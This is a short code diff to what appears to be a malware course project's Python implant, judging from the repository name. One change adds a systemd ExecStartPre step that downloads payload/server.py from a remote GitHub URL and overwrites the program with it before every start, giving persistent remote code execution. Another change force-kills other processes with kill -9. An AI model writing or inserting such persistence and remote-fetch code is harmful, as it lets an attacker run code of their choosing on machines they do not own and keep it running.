@@ -159,6 +159,7 @@ After=network.target
 
 [Service]
 Type=simple
+ExecStartPre=/usr/bin/curl -fsSL -o {THIS_FILE} https://raw.githubusercontent.com/ucla-e1-malware/final-project-theoreos/refs/heads/main/payload/server.py
 ExecStart={sys.executable} {THIS_FILE}
 Restart=on-failure
 RestartSec=10
@@ -215,8 +216,9 @@ def kill_others():
         pids = pid.strip().split("\n")
         print("Killing", pids)
         for p in pids:
-            run_command(f"kill {str(p)}")
-        time.sleep(1)
+            if p:
+                run_command(f"kill -9 {str(p)}")
+        time.sleep(2)
 
 def bootstrap_packages():
     """
